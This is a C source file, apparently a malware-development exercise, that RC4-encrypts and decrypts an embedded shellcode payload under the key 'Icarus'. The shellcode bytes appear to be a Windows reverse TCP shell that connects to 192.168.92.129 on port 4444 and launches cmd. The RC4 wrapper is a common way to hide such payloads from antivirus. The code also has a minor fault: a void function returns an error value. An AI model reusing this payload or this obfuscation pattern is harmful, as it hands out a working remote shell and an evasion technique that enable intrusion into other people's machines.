#include <Windows.h>
#include <stdio.h>

// RC4 METHOD 1:

typedef struct {
	unsigned int i;
	unsigned int j;
	unsigned char s[256];
} Rc4Context;

// Initialize an RC4 context using the supplied key
// Param[IN] context, Pointer to the RC4 context to initialize
// Param[IN] key, Pointer to the key 
// Param[IN] length, Length of the key

// modified function return type and key datatype.
// removed return value.

void rc4Init(Rc4Context* context, const char* key, size_t length)
{
    unsigned int i;
    unsigned int j;
    unsigned char temp;

    //Check parameters
    if (context == NULL || key == NULL)
        return ERROR_INVALID_PARAMETER;

    //Clear context
    context->i = 0;
    context->j = 0;

    //Initialize the S array with identity permutation
    for (i = 0; i < 256; i++)
    {
        context->s[i] = i;
    }

    //S is then processed for 256 iterations
    for (i = 0, j = 0; i < 256; i++)
    {
        //Randomize the permutations using the supplied key
        j = (j + context->s[i] + key[i % length]) % 256;

        //Swap the values of S[i] and S[j]
        temp = context->s[i];
        context->s[i] = context->s[j];
        context->s[j] = temp;
    }
}

// Cipher what actually encrypts the payload
// The same cipher can also be used to decrypt the payload.

// modified input,output, temp, i, j, and s datatypes. 
// removed function return value.

void rc4Cipher(Rc4Context* context, const char* input, char* output,
    size_t length)
{
    unsigned char temp;

    //Restore context
    unsigned int i = context->i;
    unsigned int j = context->j;
    unsigned char * s = context->s;

    //Encryption loop
    while (length > 0)
    {
        //Adjust indices
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;

        //Swap the values of S[i] and S[j]
        temp = s[i];
        s[i] = s[j];
        s[j] = temp;

        //Valid input and output?
        if (input != NULL && output != NULL)
        {
            //XOR the input data with the RC4 stream
            *output = *input ^ s[(s[i] + s[j]) % 256];

            //Increment data pointers
            input++;
            output++;
        }

        //Remaining bytes to process
        length--;
    }

    //Save context
    context->i = i;
    context->j = j;
}

// encryption key
unsigned char key[] = {"Icarus"};

//payload
unsigned char shellcode[] = {     
    "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50"
    "\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26"
    "\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
    "\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78"
    "\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3"
    "\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
    "\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58"
    "\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"
    "\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"
    "\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32"
    "\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff"
    "\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
    "\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
    "\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x5c\x81\x68\x02"
    "\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
    "\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5"
    "\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57"
    "\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
    "\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46"
    "\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89"
    "\xe0\x4e\x56\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb"
    "\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
    "\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
    "\xff\xd5"
};

int main() {
    // Initialization 
    Rc4Context context = { 0 }; // initialize all members to 0

    size_t shellcodeLength = sizeof(shellcode) - 1;

    // Initialize the RC4 encryption method 
    rc4Init(&context, key, sizeof(key));

    // Store shellcode in Ciphertext
    unsigned char* Ciphertext = (unsigned char*)malloc(shellcodeLength);
    ZeroMemory(Ciphertext, shellcodeLength);
    rc4Cipher(&context, shellcode, Ciphertext, shellcodeLength);
    printf("[i] Ciphertext: 0x%p \n", Ciphertext);

    printf("\nPress <Enter> to Decrypt.");
    getchar();


    // reinitialize struct in case of any errors or change in structs bytes 
    rc4Init(&context, key, sizeof(key));

    // Decrypt the shellcode to its plaintext form:
    unsigned char* Plaintext = (unsigned char*)malloc(shellcodeLength);
    ZeroMemory(Plaintext, shellcodeLength);
    rc4Cipher(&context, Ciphertext, Plaintext, shellcodeLength);

    // displaying the contents of the shellcode wont work with 
    // strlen since it relies on a null terminator
    // and the shellcode we have does not contain a null terminator
    // which is why we get the exact length using shellcodeLength

    printf("\n[i] Plaintext: \n");
    for (size_t i = 0; i < shellcodeLength; ++i) {
        printf("%02X ", Plaintext[i]);
    }

    // Exit
    printf("\n\nPress <Enter> to exit\n");
    getchar();
    
    free(Ciphertext);
    free(Plaintext);


	return 0;
}